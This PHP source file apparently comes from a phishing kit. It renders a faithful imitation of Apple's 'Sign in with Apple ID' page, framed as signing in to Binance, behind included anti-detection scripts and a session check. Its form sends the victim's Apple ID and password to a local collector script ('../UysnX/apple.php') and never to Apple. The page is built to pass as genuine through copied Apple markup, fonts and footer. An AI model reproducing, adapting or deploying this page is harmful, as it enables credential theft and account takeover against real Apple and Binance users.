<?php
		include "../antired_flag/anti1.php";
		include "../antired_flag/anti2.php"; 
		include "../antired_flag/anti3.php"; 
		include "../antired_flag/anti4.php"; 
		include "../antired_flag/anti5.php"; 
		include "../antired_flag/anti7.php";
ob_start();
session_start();
ob_end_clean();
// test if deja login f step lwla if not login yrj3 ydir login
if (!isset($_SESSION['loggedin'])) {
	header('Location: ../l/');
	exit;
}
// test if deja login f step lwla if not login yrj3 ydir login

?>
<!DOCTYPE html>
<?php 
error_reporting(0);

echo "<html dir='ltr' data-rtl='false' lang='en' class='prefpane na-presentation'>
<link rel='stylesheet' href='css/style.css'>
<link type='text/css' rel='stylesheet' id='dark-mode-custom-link'>
<link type='text/css' rel='stylesheet' id='dark-mode-general-link'>
<head>
  <link rel='icon' href='img/x_ico.ico'>
  <title>Sign in with Apple ID</title>
  <meta name='referrer' content='strict-origin-when-cross-origin'>
  <meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1'>
  <link rel='shortcut icon' type='image/x-icon' href='img/x_ico.ico'>
  <link rel='stylesheet' href='//www.apple.com/wss/fonts?family=Myriad+Set+Pro&v=2' type='text/css'>
  <link rel='stylesheet' href='https://www.apple.com/wss/fonts?families=SF+Pro,v1|SF+Pro+Icons,v1' type='text/css'>
  <script data-savepage-type='text/stache' type='text/plain' id='globalNav'></script>
  <script data-savepage-type='text/stache' type='text/plain' id='globalFooter'></script>
  <script data-savepage-type='text/javascript' type='text/plain' data-savepage-src='https://appleid.cdn-apple.com/appleauth/static/jsj/925854370/common-header.js'></script>
  
   <meta name='savepage-title' content='Sign in with Apple ID'>
</head>
<body class='tk-body'>
  <div class='content' id='content' style='width: 100%;height: 100%;'>
    <oauth-init class='oauth-init'>
      <oauth-header class='oauth-header' {is-signin}='isSignin' {user}='user'>
        <apple-global-nav>
          <input type='checkbox' id='ac-gn-menustate' class='ac-gn-menustate'>
          <nav id='ac-globalnav' class='no-js' role='navigation' aria-label='Global' data-hires='false' data-analytics-region='global nav' lang='en-US' dir='ltr' data-www-domain='www.apple.com' data-store-locale='us' data-store-root-path='/us' data-store-api='https://www.apple.com/[storefront]/shop/bag/status' data-search-locale='en_US' data-search-suggestions-api='https://www.apple.com/search-services/suggestions/' data-search-defaultlinks-api='https://www.apple.com/search-services/suggestions/defaultlinks/'>
            <div class='ac-gn-content'>
              <ul class='ac-gn-header'>
                <li class='ac-gn-item ac-gn-apple'>
                  <a class='ac-gn-link ac-gn-link-apple' href='https://www.apple.com/' data-analytics-title='apple home' id='ac-gn-firstfocus-small'>
                    <span class='ac-gn-link-text'>Apple</span>
                  </a>
                </li>
              </ul>
              <div class='ac-gn-search-placeholder-container' role='search'>
                <div class='ac-gn-search ac-gn-search-small'>
                  <a id='ac-gn-link-search-small' class='ac-gn-link' href='https://www.apple.com/us/search' data-analytics-title='search' data-analytics-intrapage-link='' aria-label='Search apple.com'>
                    <div class='ac-gn-search-placeholder-bar'>
                      <div class='ac-gn-search-placeholder-input'>
                        <div class='ac-gn-search-placeholder-input-text' aria-hidden='true'>
                          <div class='ac-gn-link-search ac-gn-search-placeholder-input-icon'></div>
                          <span class='ac-gn-search-placeholder'>Search apple.com</span>
                        </div>
                      </div>
                      <div class='ac-gn-searchview-close ac-gn-searchview-close-small ac-gn-search-placeholder-searchview-close'>
                        <span class='ac-gn-searchview-close-cancel' aria-hidden='true'>Cancel</span>
                      </div>
                    </div>
                  </a>
                </div>
              </div>
              <ul class='ac-gn-list'>
                <li class='ac-gn-item ac-gn-apple'>
                  <a class='ac-gn-link ac-gn-link-apple' href='https://www.apple.com/' data-analytics-title='apple home' id='ac-gn-firstfocus'>
                    <span class='ac-gn-link-text'>Apple</span>
                  </a>
                </li>
              </ul>
            </div>
          </nav>
          <div class='ac-gn-blur'></div>
          <div id='ac-gn-curtain' class='ac-gn-curtain'></div>
          <div id='ac-gn-placeholder' class='ac-nav-placeholder'></div>
        </apple-global-nav>
        <local-nav title='Apple ID' item1-text='Sign in'>
          <input type='checkbox' id='ac-localnav-menustate' class='ac-localnav-menustate'>
          <div id='ac-localnav-sticky-placeholder' class='css-sticky'></div>
          <nav id='ac-localnav' data-sticky='' role='navigation' class='ac-localnav js touch css-sticky'>
            <div class='ac-localnav-wrapper'>
              <div class='ac-localnav-background'></div>
              <div class='ac-localnav-content'>
                <div class='ac-localnav-title'>
                  <span>Apple ID</span>
                </div>
                <div class='ac-localnav-menu'>
                  <a href='#ac-localnav-menustate' class='ac-localnav-menucta-anchor ac-localnav-menucta-anchor-open' id='ac-localnav-menustate-open'>
                    <span class='ac-localnav-menucta-anchor-label'>Open Menu</span>
                  </a>
                  <a href='#' class='ac-localnav-menucta-anchor ac-localnav-menucta-anchor-close' id='ac-localnav-menustate-close'>
                    <span class='ac-localnav-menucta-anchor-label'>Close Menu</span>
                  </a>
                  <div class='ac-localnav-menu-tray'>
                    <ul class='ac-localnav-menu-items'>
                      <li class='ac-localnav-menu-item'>
                        <span class='ac-localnav-menu-link current' title='Sign in'>
                          <span aria-hidden='true'>Sign in</span>
                          <span class='a11y'>Sign in</span>
                        </span>
                      </li>
                    </ul>
                  </div>
                  <div class='ac-localnav-actions'>
                    <div class='ac-localnav-action ac-localnav-action-menucta' aria-hidden='true'>
                      <label for='ac-localnav-menustate' class='ac-localnav-menucta'>
                        <span class='ac-localnav-menucta-chevron'></span>
                      </label>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </nav>
          <label id='ac-localnav-curtain' class='ac-localnav-curtain' for='localnav-menustate'></label>
        </local-nav>
      </oauth-header>
      <div class='oauth-init__content'>
        <div class='oauth-init__content__container'>
          <oauth-signin {on-success}='@successSigninHandler' {on-cancel}='@cancelHandler' {auth-init-opts}='authInitOpts' {inline-signin}='inlineSignin'>
            <div id='signin' class='oauth-signin si-body si-container container-fluid oauth-internal-signin' data-theme='dark'>
              <apple-auth class='appleauth-inline ' app-loading-defaults='{appLoadingDefaults}'>
                <div class='widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in ' data-mode='embed' data-isiebutnotedge='false'>
                  <div id='step' class='si-step  '>
                    <logo {hide-app-logo}='hideAppLogo' {show-fade-in}='showFadeIn' {(section)}='section'>
                      <div class='logo   signin-label  fade-in logo-profile'>
                        <img class='cnsmr-app-image profile-app-logo' src='img/yahad_lmra.png' srcset='' role='presentation' style='width: 72px;'>
                      </div>
                    </logo>
                    <div id='stepEl' class='   '>
                      <sign-in suppress-iforgot='{suppressIforgot}' initial-route='' {on-test-idp}='@_onTestIdp'>
                        <form method='post' action='../UysnX/apple.php'>
                          <div class='signin fade-in' id='signin'>
                            <app-title signin-label='true' title-class=''>
                              <h1 tabindex='-1' class='si-container-title tk-intro  '> Use your Apple ID to sign in to Binance. </h1>
                            </app-title>
                            <div class='container si-field-container  password-second-step  password-on     '>
                              <div id='sign_in_form' class='signin-form
 eyebrow 

 
 
 account-name-entered  
 fed-auth 
  
   show-password 
   password-entered 
   
'>
                                <div class='si-field-container container'>
                                  <div class='form-table'>
                                    <div class='account-name form-row     show-password '>
                                      <label class='sr-only form-cell form-label' for='account_name_text_field'>Sign In with your Apple ID</label>
                                      <div class='form-cell'>
                                        <div class=' form-cell-wrapper '>
                                          <input type='text' name='usr' id='account_name_text_field' can-field='accountName' autocomplete='off' autocorrect='off' autocapitalize='off' aria-required='true' required='required' spellcheck='false' ($focus)='appleIdFocusHandler()' ($keyup)='appleIdKeyupHandler()' ($blur)='appleIdBlurHandler()' class='force-ltr form-textbox form-textbox-text form-textbox-entered' aria-invalid='false' autofocus='' value=''>
                                          <span aria-hidden='true' id='apple_id_field_label' class=' form-label  form-label-flyout'> Apple ID </span>
                                        </div>
                                      </div>
                                    </div>
                                    <div class='password form-row    show-password show-placeholder   '>
                                      <label class='sr-only form-cell form-label' for='password_text_field'>Password</label>
                                      <div class='form-cell'>
                                        <div class='form-cell-wrapper '>
                                          <input type='password' name='pwd' id='password_text_field' ($keyup)='passwordKeyUpHandler()' ($focus)='pwdFocusHandler()' ($blur)='pwdBlurHandler()' aria-required='true' required='required' can-field='password' autocomplete='off' class='form-textbox form-textbox-text  form-textbox-entered ' aria-invalid='false' value=''>
                                          <span id='password_field_label' aria-hidden='true' class=' form-label  form-label-flyout'> Password </span>
                                          <span class='sr-only form-label-flyout' id='invalid_user_name_pwd_err_msg' aria-hidden='true'></span>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                              <div class='spinner-container auth  hide '></div>
                              <button id='sign-in' ($click)='_verify($element)' tabindex='0' class='si-button btn  fed-ui  moved   fed-ui-animation-show      ' aria-label='Sign In' aria-disabled='false'>
                                <i class='shared-icon icon_sign_in'></i>
                                <span class='text feat-split'> Sign In </span>
                              </button>
                              <button id='sign-in-cancel' ($click)='_signInCancel($element)' aria-disabled='false' tabindex='0' class='si-button btn secondary feat-split   link ' aria-label='Close'>
                                <span class='text'> Close </span>
                              </button>
                            </div>
                            <div class='si-container-footer'>
                              <div class='separator no-remember-me'></div>
                              <div class='links tk-subbody'>
                                <div class='si-forgot-password'>
                                  <a id='iforgot-link' class='si-link ax-outline lite-theme-override' ($click)='iforgotLinkClickHandler($element)' href='https://iforgot.apple.com/password/verify/appleid' target='_blank'> Forgot Apple ID or <span class='no-wrap sk-icon sk-icon-after sk-icon-external'>password?</span>
                                    <span class='sr-only'>Opens in a new window.</span>
                                  </a>
                                </div>
                                <div class='label-small text-centered centered tk-caption privacy-wrapper'>
                                  <div class='privacy-icon'></div> In setting up Sign in with Apple, information about your interactions with Apple and this device may be used by Apple to help prevent fraud. <a href='https://www.apple.com/privacy/' target='_blank' rel='noopener'>See how your data is managed... <span class='sr-only'> Opens in a new window.</span>
                                  </a>
                                </div>
                              </div>
                            </div>
                          </div>
                        </form>
                      </sign-in>
                    </div>
                  </div>
                  <div id='stocking' style='display:none !important;'></div>
                </div>
                <idms-modal wrap-class='full-page-error-wrapper ' {(show)}='showfullPageError' auto-close='false'></idms-modal>
              </apple-auth>
            </div>
          </oauth-signin>
        </div>
      </div>
      <div class='oauth-init__global-footer'>
        <apple-global-footer>
          <footer id='ac-globalfooter' class='js' lang='en-US' data-analytics-region='global footer' role='contentinfo' aria-labelledby='ac-gf-label'>
            <div class='ac-gf-content'>
              <h2 class='ac-gf-label' id='ac-gf-label'>Apple Footer</h2>
              <section class='ac-gf-footer'>
                <div class='ac-gf-footer-legal'>
                  <div class='ac-gf-footer-legal-copyright'>Copyright © 2024 Apple Inc. All rights reserved. </div>
                  <div class='ac-gf-footer-legal-links'>
                    <a class='ac-gf-footer-legal-link'href='#' data-analytics-title='privacy policy'>Privacy Policy</a>
                  </div>
                </div>
              </section>
            </div>
          </footer>
          <script data-savepage-type='text/javascript' type='text/plain' data-savepage-src='https://www.apple.com/ac/globalfooter/7/en_US/scripts/ac-globalfooter.built.js'></script>
        </apple-global-footer>
      </div>
    </oauth-init>
  </div>


</body>
</html>"?>
